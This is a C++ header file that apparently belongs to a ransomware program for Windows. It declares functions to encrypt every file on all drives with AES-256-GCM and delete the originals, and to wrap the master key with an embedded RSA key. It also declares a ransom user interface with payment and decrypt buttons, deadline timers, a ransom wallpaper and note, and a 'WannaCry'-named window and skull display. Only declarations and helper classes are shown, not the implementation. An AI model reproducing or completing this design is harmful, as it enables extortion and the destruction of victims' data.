#pragma once

#include <cstddef>          // size_t
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <functional>
#include <string>
#include <vector>
#include <atomic>
#include <cstdint>
#include <windows.h>
#include <openssl/ossl_typ.h>   // RSA
#include <cstddef>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <functional>
#include <string>
#include <vector>
#include <atomic>
#include <cstdint>
#include <windows.h>
#include <openssl/ossl_typ.h>

constexpr size_t AES_256_KEY_SIZE    = 32;
constexpr size_t GCM_IV_LENGTH       = 12;
constexpr size_t GCM_TAG_LENGTH      = 16;
constexpr size_t BUFFER_SIZE         = 64 * 1024;
constexpr size_t THREAD_POOL_SIZE    = 0;


extern const char* RSA_MODULUS_DEC;
extern const unsigned long RSA_E;


#define IDC_TIMER_DEADLINE1  1001
#define IDC_TIMER_DEADLINE2  1002
#define IDC_BTN_PAYMENT      2001
#define IDC_BTN_DECRYPT      2002
#define IDC_BTN_CONTACT      2003
#define IDT_REFRESH_TIMER    3001

class SecureBuffer;

struct AppData {
    HINSTANCE hInstance;
    SecureBuffer* masterKey;
};


class SecureBuffer {
    std::vector<uint8_t> data_;
    bool locked_ = false;
public:
    explicit SecureBuffer(size_t size) : data_(size) {
        if (!data_.empty() && VirtualLock(data_.data(), data_.size())) locked_ = true;
    }
    ~SecureBuffer() { wipe(); }
    SecureBuffer(const SecureBuffer&) = delete;
    SecureBuffer& operator=(const SecureBuffer&) = delete;
    SecureBuffer(SecureBuffer&& o) noexcept : data_(std::move(o.data_)), locked_(o.locked_) {
        o.data_.clear(); o.locked_ = false;
    }
    SecureBuffer& operator=(SecureBuffer&& o) noexcept {
        if (this != &o) { wipe(); data_ = std::move(o.data_); locked_ = o.locked_; o.data_.clear(); o.locked_ = false; }
        return *this;
    }
    uint8_t* data() { return data_.data(); }
    const uint8_t* data() const { return data_.data(); }
    size_t size() const { return data_.size(); }
    bool empty() const { return data_.empty(); }
    void clear() { wipe(); }
private:
    void wipe() {
        if (!data_.empty()) {
            SecureZeroMemory(data_.data(), data_.size());
            if (locked_) { VirtualUnlock(data_.data(), data_.size()); locked_ = false; }
        }
    }
};


class ThreadPool {
public:
    ThreadPool(size_t numThreads) : stop(false) {
        for (size_t i = 0; i < numThreads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queueMutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }

    template<class F>
    void enqueue(F&& f) {
        {
            std::unique_lock<std::mutex> lock(queueMutex);
            tasks.emplace(std::forward<F>(f));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        {
            std::unique_lock<std::mutex> lock(queueMutex);
            stop = true;
        }
        condition.notify_all();
        for (std::thread& worker : workers) worker.join();
    }

private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queueMutex;
    std::condition_variable condition;
    bool stop;
};


RSA* CreatePublicKeyFromDecimalModulus(const char* modulusDec, unsigned long e);
std::vector<uint8_t> RSAEncryptOAEP(const std::vector<uint8_t>& plaintext, RSA* pubKey);
void WriteEncryptedMasterKeyToFile(SecureBuffer& masterKey);


SecureBuffer generateAESKey();
std::vector<uint8_t> generateNonce();
void EncryptFileStream(const std::wstring& inputPath, const SecureBuffer& key, const std::wstring& outputPath);
void DecryptFileStream(const std::wstring& inputPath, const SecureBuffer& key, const std::wstring& outputPath);
void EncryptFile(const std::wstring& inputPath, const SecureBuffer& key);
void DecryptFile(const std::wstring& inputPath, const SecureBuffer& key);
void EncryptDirectory(const std::wstring& dirPath, const SecureBuffer& key,
                      bool deleteOriginals, std::atomic<size_t>& count,
                      std::atomic<size_t>& skipped, ThreadPool& pool);

void DecryptDirectory(const std::wstring& dirPath, const SecureBuffer& key,
                      bool deleteEncrypted, std::atomic<size_t>& count,
                      std::atomic<size_t>& skipped, ThreadPool& pool);
void EncryptAllDrives(const SecureBuffer& key, bool deleteOriginals, std::atomic<size_t>& count, std::atomic<size_t>& skipped);
void DecryptAllDrives(const SecureBuffer& key, bool deleteEncrypted, std::atomic<size_t>& count, std::atomic<size_t>& skipped);


std::wstring GetUserDesktopPath();
bool FileExists(const std::wstring& path);
bool HasReadWriteAccess(const std::wstring& filePath);
bool SecureDeleteFile(const std::wstring& filePath);
void SaveKeyHash(const SecureBuffer& key, const std::wstring& hashPath);
bool CheckKeyValidity(const std::string& keyHex, const std::wstring& hashPath);
std::wstring GetUniqueFilePath(const std::wstring& basePath);
SecureBuffer MasterKeyFromHexWString(const std::wstring& hex);
std::string WStringToString(const std::wstring& wstr);
std::wstring GetMasterKeyHashPath();
bool CheckKeyValidityFromBuffer(const SecureBuffer& key, const std::wstring& hashPath);
int CheckKeyValidityDebug(const SecureBuffer& key, const std::wstring& hashPath);
std::wstring GetMasterKeyHashPath();
std::wstring GetMasterKeyEncPath();
std::wstring GetMarkerFilePath();
bool IsEncryptionMarkerPresent();
void CreateEncryptionMarker();
void RemoveEncryptionMarker();


void GenerateWallpaperAndNote(const std::wstring& wallpaperPath, const std::wstring& notePath);
void MoveDesktopItems(const wchar_t* folderName);
LRESULT CALLBACK KeyDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
bool AskForMasterKey(HINSTANCE hInstance, HWND hParent, const std::wstring& hashPath, SecureBuffer& outMasterKey);
LRESULT CALLBACK WannaCryWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void ShowSkull();
LRESULT CALLBACK SkullWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
